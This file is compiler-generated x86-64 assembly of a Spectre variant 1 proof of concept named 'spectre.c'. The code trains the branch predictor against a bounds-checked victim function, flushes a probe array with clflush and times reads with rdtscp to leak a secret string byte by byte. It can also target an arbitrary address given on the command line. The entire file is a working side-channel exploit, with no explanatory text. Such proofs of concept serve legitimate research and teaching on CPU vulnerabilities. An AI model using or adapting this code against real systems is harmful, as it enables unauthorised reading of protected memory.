	.file	"spectre.c"
	.intel_syntax noprefix
	.text
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.globl	unused1
	.bss
	.align 32
	.type	unused1, @object
	.size	unused1, 64
unused1:
	.zero	64
	.globl	array1
	.data
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	143
	.globl	unused2
	.bss
	.align 32
	.type	unused2, @object
	.size	unused2, 64
unused2:
	.zero	64
	.globl	array2
	.align 32
	.type	array2, @object
	.size	array2, 131072
array2:
	.zero	131072
	.globl	secret
	.section	.rodata
	.align 8
.LC0:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.data.rel.local,"aw"
	.align 8
	.type	secret, @object
	.size	secret, 8
secret:
	.quad	.LC0
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.text
	.globl	check
	.type	check, @function
check:
.LFB4373:
	.cfi_startproc
	endbr64
	push	rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	mov	rbp, rsp
	.cfi_def_cfa_register 6
	mov	QWORD PTR -8[rbp], rdi
	mov	eax, DWORD PTR array1_size[rip]
	cdqe
	cmp	QWORD PTR -8[rbp], rax
	jnb	.L2
	mov	eax, 1
	jmp	.L3
.L2:
	mov	eax, 0
.L3:
	pop	rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4373:
	.size	check, .-check
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB4374:
	.cfi_startproc
	endbr64
	push	rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	mov	rbp, rsp
	.cfi_def_cfa_register 6
	mov	QWORD PTR -8[rbp], rdi
	mov	eax, DWORD PTR array1_size[rip]
	cdqe
	cmp	QWORD PTR -8[rbp], rax
	jnb	.L6
	lea	rax, temp[rip]
	movzx	eax, BYTE PTR [rax]
	lea	rcx, array1[rip]
	mov	rdx, QWORD PTR -8[rbp]
	add	rdx, rcx
	movzx	edx, BYTE PTR [rdx]
	movzx	edx, dl
	sal	edx, 9
	movsx	rdx, edx
	lea	rcx, array2[rip]
	add	rdx, rcx
	movzx	edx, BYTE PTR [rdx]
	sub	eax, edx
	mov	BYTE PTR temp[rip], al
.L6:
	nop
	pop	rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4374:
	.size	victim_function, .-victim_function
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB4375:
	.cfi_startproc
	endbr64
	push	rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	mov	rbp, rsp
	.cfi_def_cfa_register 6
	push	r12
	push	rbx
	add	rsp, -128
	.cfi_offset 12, -24
	.cfi_offset 3, -32
	mov	QWORD PTR -120[rbp], rdi
	mov	QWORD PTR -128[rbp], rsi
	mov	QWORD PTR -136[rbp], rdx
	mov	rax, QWORD PTR fs:40
	mov	QWORD PTR -24[rbp], rax
	xor	eax, eax
	mov	DWORD PTR -108[rbp], 0
	mov	DWORD PTR -96[rbp], 0
	jmp	.L8
.L9:
	mov	eax, DWORD PTR -96[rbp]
	cdqe
	lea	rdx, 0[0+rax*4]
	lea	rax, results.0[rip]
	mov	DWORD PTR [rdx+rax], 0
	add	DWORD PTR -96[rbp], 1
.L8:
	cmp	DWORD PTR -96[rbp], 255
	jle	.L9
	mov	DWORD PTR -100[rbp], 999
	jmp	.L10
.L30:
	mov	DWORD PTR -96[rbp], 0
	jmp	.L11
.L12:
	mov	eax, DWORD PTR -96[rbp]
	sal	eax, 9
	cdqe
	lea	rdx, array2[rip]
	add	rax, rdx
	mov	QWORD PTR -56[rbp], rax
	mov	rax, QWORD PTR -56[rbp]
	clflush	[rax]
	nop
	add	DWORD PTR -96[rbp], 1
.L11:
	cmp	DWORD PTR -96[rbp], 255
	jle	.L12
	mov	ecx, DWORD PTR array1_size[rip]
	mov	eax, DWORD PTR -100[rbp]
	cdq
	idiv	ecx
	mov	eax, edx
	cdqe
	mov	QWORD PTR -80[rbp], rax
	mov	DWORD PTR -92[rbp], 29
	jmp	.L13
.L16:
	lea	rax, array1_size[rip]
	mov	QWORD PTR -48[rbp], rax
	mov	rax, QWORD PTR -48[rbp]
	clflush	[rax]
	nop
	mov	DWORD PTR -104[rbp], 0
	jmp	.L14
.L15:
	mov	eax, DWORD PTR -104[rbp]
	add	eax, 1
	mov	DWORD PTR -104[rbp], eax
.L14:
	mov	eax, DWORD PTR -104[rbp]
	cmp	eax, 99
	jle	.L15
	mov	ecx, DWORD PTR -92[rbp]
	movsx	rax, ecx
	imul	rax, rax, 715827883
	shr	rax, 32
	mov	esi, ecx
	sar	esi, 31
	mov	edx, eax
	sub	edx, esi
	mov	eax, edx
	add	eax, eax
	add	eax, edx
	add	eax, eax
	sub	ecx, eax
	mov	edx, ecx
	lea	eax, -1[rdx]
	mov	ax, 0
	cdqe
	mov	QWORD PTR -64[rbp], rax
	mov	rax, QWORD PTR -64[rbp]
	shr	rax, 16
	or	QWORD PTR -64[rbp], rax
	mov	rax, QWORD PTR -120[rbp]
	xor	rax, QWORD PTR -80[rbp]
	and	rax, QWORD PTR -64[rbp]
	xor	rax, QWORD PTR -80[rbp]
	mov	QWORD PTR -64[rbp], rax
	mov	rax, QWORD PTR -64[rbp]
	mov	rdi, rax
	call	victim_function
	sub	DWORD PTR -92[rbp], 1
.L13:
	cmp	DWORD PTR -92[rbp], 0
	jns	.L16
	mov	DWORD PTR -96[rbp], 0
	jmp	.L17
.L21:
	mov	eax, DWORD PTR -96[rbp]
	imul	eax, eax, 167
	add	eax, 13
	and	eax, 255
	mov	DWORD PTR -84[rbp], eax
	mov	eax, DWORD PTR -84[rbp]
	sal	eax, 9
	cdqe
	lea	rdx, array2[rip]
	add	rax, rdx
	mov	QWORD PTR -72[rbp], rax
	lea	rax, -108[rbp]
	mov	QWORD PTR -32[rbp], rax
	rdtscp
	mov	esi, ecx
	mov	rcx, QWORD PTR -32[rbp]
	mov	DWORD PTR [rcx], esi
	sal	rdx, 32
	or	rax, rdx
	mov	r12, rax
	mov	rax, QWORD PTR -72[rbp]
	movzx	eax, BYTE PTR [rax]
	movzx	eax, al
	mov	DWORD PTR -108[rbp], eax
	lea	rax, -108[rbp]
	mov	QWORD PTR -40[rbp], rax
	rdtscp
	mov	esi, ecx
	mov	rcx, QWORD PTR -40[rbp]
	mov	DWORD PTR [rcx], esi
	sal	rdx, 32
	or	rax, rdx
	sub	rax, r12
	mov	rbx, rax
	cmp	rbx, 100
	ja	.L20
	mov	ecx, DWORD PTR array1_size[rip]
	mov	eax, DWORD PTR -100[rbp]
	cdq
	idiv	ecx
	mov	eax, edx
	cdqe
	lea	rdx, array1[rip]
	movzx	eax, BYTE PTR [rax+rdx]
	movzx	eax, al
	cmp	DWORD PTR -84[rbp], eax
	je	.L20
	mov	eax, DWORD PTR -84[rbp]
	cdqe
	lea	rdx, 0[0+rax*4]
	lea	rax, results.0[rip]
	mov	eax, DWORD PTR [rdx+rax]
	lea	ecx, 1[rax]
	mov	eax, DWORD PTR -84[rbp]
	cdqe
	lea	rdx, 0[0+rax*4]
	lea	rax, results.0[rip]
	mov	DWORD PTR [rdx+rax], ecx
.L20:
	add	DWORD PTR -96[rbp], 1
.L17:
	cmp	DWORD PTR -96[rbp], 255
	jle	.L21
	mov	DWORD PTR -88[rbp], -1
	mov	eax, DWORD PTR -88[rbp]
	mov	DWORD PTR -92[rbp], eax
	mov	DWORD PTR -96[rbp], 0
	jmp	.L22
.L27:
	cmp	DWORD PTR -92[rbp], 0
	js	.L23
	mov	eax, DWORD PTR -96[rbp]
	cdqe
	lea	rdx, 0[0+rax*4]
	lea	rax, results.0[rip]
	mov	edx, DWORD PTR [rdx+rax]
	mov	eax, DWORD PTR -92[rbp]
	cdqe
	lea	rcx, 0[0+rax*4]
	lea	rax, results.0[rip]
	mov	eax, DWORD PTR [rcx+rax]
	cmp	edx, eax
	jl	.L24
.L23:
	mov	eax, DWORD PTR -92[rbp]
	mov	DWORD PTR -88[rbp], eax
	mov	eax, DWORD PTR -96[rbp]
	mov	DWORD PTR -92[rbp], eax
	jmp	.L25
.L24:
	cmp	DWORD PTR -88[rbp], 0
	js	.L26
	mov	eax, DWORD PTR -96[rbp]
	cdqe
	lea	rdx, 0[0+rax*4]
	lea	rax, results.0[rip]
	mov	edx, DWORD PTR [rdx+rax]
	mov	eax, DWORD PTR -88[rbp]
	cdqe
	lea	rcx, 0[0+rax*4]
	lea	rax, results.0[rip]
	mov	eax, DWORD PTR [rcx+rax]
	cmp	edx, eax
	jl	.L25
.L26:
	mov	eax, DWORD PTR -96[rbp]
	mov	DWORD PTR -88[rbp], eax
.L25:
	add	DWORD PTR -96[rbp], 1
.L22:
	cmp	DWORD PTR -96[rbp], 255
	jle	.L27
	mov	eax, DWORD PTR -88[rbp]
	cdqe
	lea	rdx, 0[0+rax*4]
	lea	rax, results.0[rip]
	mov	eax, DWORD PTR [rdx+rax]
	add	eax, 2
	lea	ecx, [rax+rax]
	mov	eax, DWORD PTR -92[rbp]
	cdqe
	lea	rdx, 0[0+rax*4]
	lea	rax, results.0[rip]
	mov	eax, DWORD PTR [rdx+rax]
	cmp	ecx, eax
	jl	.L28
	mov	eax, DWORD PTR -92[rbp]
	cdqe
	lea	rdx, 0[0+rax*4]
	lea	rax, results.0[rip]
	mov	eax, DWORD PTR [rdx+rax]
	cmp	eax, 2
	jne	.L29
	mov	eax, DWORD PTR -88[rbp]
	cdqe
	lea	rdx, 0[0+rax*4]
	lea	rax, results.0[rip]
	mov	eax, DWORD PTR [rdx+rax]
	test	eax, eax
	je	.L28
.L29:
	sub	DWORD PTR -100[rbp], 1
.L10:
	cmp	DWORD PTR -100[rbp], 0
	jg	.L30
.L28:
	mov	eax, DWORD PTR results.0[rip]
	mov	edx, eax
	mov	eax, DWORD PTR -108[rbp]
	xor	eax, edx
	mov	DWORD PTR results.0[rip], eax
	mov	eax, DWORD PTR -92[rbp]
	mov	edx, eax
	mov	rax, QWORD PTR -128[rbp]
	mov	BYTE PTR [rax], dl
	mov	eax, DWORD PTR -92[rbp]
	cdqe
	lea	rdx, 0[0+rax*4]
	lea	rax, results.0[rip]
	mov	edx, DWORD PTR [rdx+rax]
	mov	rax, QWORD PTR -136[rbp]
	mov	DWORD PTR [rax], edx
	mov	rax, QWORD PTR -128[rbp]
	add	rax, 1
	mov	edx, DWORD PTR -88[rbp]
	mov	BYTE PTR [rax], dl
	mov	rax, QWORD PTR -136[rbp]
	lea	rdx, 4[rax]
	mov	eax, DWORD PTR -88[rbp]
	cdqe
	lea	rcx, 0[0+rax*4]
	lea	rax, results.0[rip]
	mov	eax, DWORD PTR [rcx+rax]
	mov	DWORD PTR [rdx], eax
	nop
	mov	rax, QWORD PTR -24[rbp]
	sub	rax, QWORD PTR fs:40
	je	.L31
	call	__stack_chk_fail@PLT
.L31:
	sub	rsp, -128
	pop	rbx
	pop	r12
	pop	rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4375:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata
	.align 8
.LC1:
	.string	"Putting '%s' in memory, address %p\n"
.LC2:
	.string	"%p"
.LC3:
	.string	"%d"
	.align 8
.LC4:
	.string	"Trying malicious_x = %p, len = %d\n"
.LC5:
	.string	"Reading %d bytes:\n"
	.align 8
.LC6:
	.string	"Reading at malicious_x = %p secc= %c ..."
.LC7:
	.string	"Success"
.LC8:
	.string	"Unclear"
.LC9:
	.string	"%s: "
.LC10:
	.string	"0x%02X='%c' score=%d "
	.align 8
.LC11:
	.string	"(second best: 0x%02X='%c' score=%d)"
.LC12:
	.string	"addr = %llx, pid = %d\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB4376:
	.cfi_startproc
	endbr64
	push	rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	mov	rbp, rsp
	.cfi_def_cfa_register 6
	sub	rsp, 80
	mov	DWORD PTR -68[rbp], edi
	mov	QWORD PTR -80[rbp], rsi
	mov	rax, QWORD PTR fs:40
	mov	QWORD PTR -8[rbp], rax
	xor	eax, eax
.L50:
	call	getchar@PLT
	mov	BYTE PTR -49[rbp], al
	cmp	BYTE PTR -49[rbp], 114
	jne	.L33
	mov	rdx, QWORD PTR secret[rip]
	mov	rax, QWORD PTR secret[rip]
	mov	rsi, rax
	lea	rax, .LC1[rip]
	mov	rdi, rax
	mov	eax, 0
	call	printf@PLT
	mov	rax, QWORD PTR secret[rip]
	lea	rdx, array1[rip]
	sub	rax, rdx
	mov	QWORD PTR -40[rbp], rax
	mov	rax, QWORD PTR secret[rip]
	mov	rdi, rax
	call	strlen@PLT
	mov	DWORD PTR -48[rbp], eax
	mov	QWORD PTR -32[rbp], 0
	jmp	.L34
.L35:
	lea	rdx, array2[rip]
	mov	rax, QWORD PTR -32[rbp]
	add	rax, rdx
	mov	BYTE PTR [rax], 1
	add	QWORD PTR -32[rbp], 1
.L34:
	cmp	QWORD PTR -32[rbp], 131071
	jbe	.L35
	cmp	DWORD PTR -68[rbp], 3
	jne	.L36
	mov	rax, QWORD PTR -80[rbp]
	add	rax, 8
	mov	rax, QWORD PTR [rax]
	lea	rdx, -40[rbp]
	lea	rcx, .LC2[rip]
	mov	rsi, rcx
	mov	rdi, rax
	mov	eax, 0
	call	__isoc99_sscanf@PLT
	mov	rax, QWORD PTR -40[rbp]
	lea	rdx, array1[rip]
	sub	rax, rdx
	mov	QWORD PTR -40[rbp], rax
	mov	rax, QWORD PTR -80[rbp]
	add	rax, 16
	mov	rax, QWORD PTR [rax]
	lea	rdx, -48[rbp]
	lea	rcx, .LC3[rip]
	mov	rsi, rcx
	mov	rdi, rax
	mov	eax, 0
	call	__isoc99_sscanf@PLT
	mov	eax, DWORD PTR -48[rbp]
	mov	rdx, QWORD PTR -40[rbp]
	mov	rcx, rdx
	mov	edx, eax
	mov	rsi, rcx
	lea	rax, .LC4[rip]
	mov	rdi, rax
	mov	eax, 0
	call	printf@PLT
.L36:
	mov	eax, DWORD PTR -48[rbp]
	mov	esi, eax
	lea	rax, .LC5[rip]
	mov	rdi, rax
	mov	eax, 0
	call	printf@PLT
	mov	DWORD PTR -44[rbp], 0
	jmp	.L37
.L45:
	mov	rdx, QWORD PTR secret[rip]
	mov	eax, DWORD PTR -44[rbp]
	cdqe
	add	rax, rdx
	movzx	eax, BYTE PTR [rax]
	movsx	eax, al
	mov	rdx, QWORD PTR -40[rbp]
	mov	rcx, rdx
	mov	edx, eax
	mov	rsi, rcx
	lea	rax, .LC6[rip]
	mov	rdi, rax
	mov	eax, 0
	call	printf@PLT
	add	DWORD PTR -44[rbp], 1
	mov	rax, QWORD PTR -40[rbp]
	lea	rdx, 1[rax]
	mov	QWORD PTR -40[rbp], rdx
	lea	rdx, -20[rbp]
	lea	rcx, -10[rbp]
	mov	rsi, rcx
	mov	rdi, rax
	call	readMemoryByte
	mov	eax, DWORD PTR -20[rbp]
	mov	edx, DWORD PTR -16[rbp]
	add	edx, edx
	cmp	eax, edx
	jl	.L38
	lea	rax, .LC7[rip]
	jmp	.L39
.L38:
	lea	rax, .LC8[rip]
.L39:
	mov	rsi, rax
	lea	rax, .LC9[rip]
	mov	rdi, rax
	mov	eax, 0
	call	printf@PLT
	mov	edx, DWORD PTR -20[rbp]
	movzx	eax, BYTE PTR -10[rbp]
	cmp	al, 31
	jbe	.L40
	movzx	eax, BYTE PTR -10[rbp]
	cmp	al, 126
	ja	.L40
	movzx	eax, BYTE PTR -10[rbp]
	movzx	eax, al
	jmp	.L41
.L40:
	mov	eax, 63
.L41:
	movzx	ecx, BYTE PTR -10[rbp]
	movzx	esi, cl
	mov	ecx, edx
	mov	edx, eax
	lea	rax, .LC10[rip]
	mov	rdi, rax
	mov	eax, 0
	call	printf@PLT
	mov	eax, DWORD PTR -16[rbp]
	test	eax, eax
	jle	.L42
	mov	edx, DWORD PTR -16[rbp]
	movzx	eax, BYTE PTR -9[rbp]
	cmp	al, 31
	jbe	.L43
	movzx	eax, BYTE PTR -9[rbp]
	cmp	al, 126
	ja	.L43
	movzx	eax, BYTE PTR -9[rbp]
	movzx	eax, al
	jmp	.L44
.L43:
	mov	eax, 63
.L44:
	movzx	ecx, BYTE PTR -9[rbp]
	movzx	esi, cl
	mov	ecx, edx
	mov	edx, eax
	lea	rax, .LC11[rip]
	mov	rdi, rax
	mov	eax, 0
	call	printf@PLT
.L42:
	mov	edi, 10
	call	putchar@PLT
.L37:
	mov	eax, DWORD PTR -48[rbp]
	sub	eax, 1
	mov	DWORD PTR -48[rbp], eax
	mov	eax, DWORD PTR -48[rbp]
	test	eax, eax
	jns	.L45
	jmp	.L50
.L33:
	cmp	BYTE PTR -49[rbp], 10
	je	.L53
	cmp	BYTE PTR -49[rbp], 105
	jne	.L54
	mov	eax, 0
	call	getpid@PLT
	mov	edx, eax
	lea	rax, check[rip]
	add	rax, 33
	mov	rsi, rax
	lea	rax, .LC12[rip]
	mov	rdi, rax
	mov	eax, 0
	call	printf@PLT
	jmp	.L50
.L53:
	nop
	jmp	.L50
.L54:
	nop
	mov	eax, 0
	mov	rdx, QWORD PTR -8[rbp]
	sub	rdx, QWORD PTR fs:40
	je	.L52
	call	__stack_chk_fail@PLT
.L52:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4376:
	.size	main, .-main
	.local	results.0
	.comm	results.0,1024,32
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	1f - 0f
	.long	4f - 1f
	.long	5
0:
	.string	"GNU"
1:
	.align 8
	.long	0xc0000002
	.long	3f - 2f
2:
	.long	0x3
3:
	.align 8
4:
